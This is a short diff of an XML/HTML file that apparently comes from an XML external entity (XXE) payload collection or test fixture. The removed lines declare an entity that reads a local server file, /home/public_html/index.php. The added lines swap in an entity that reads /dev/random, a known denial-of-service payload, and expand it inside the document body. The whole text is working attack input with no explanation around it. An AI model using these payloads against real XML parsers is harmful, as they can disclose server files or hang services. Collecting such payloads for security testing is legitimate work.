@@ -1,7 +1,12 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE html [ <!ENTITY xxe SYSTEM "file:///home/public_html/index.php"> ]>
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
 <html>
 <head>
   <title>&xxe;</title>
 </head>
+  <foo>&xxe;</foo>
 </html> 
+
+
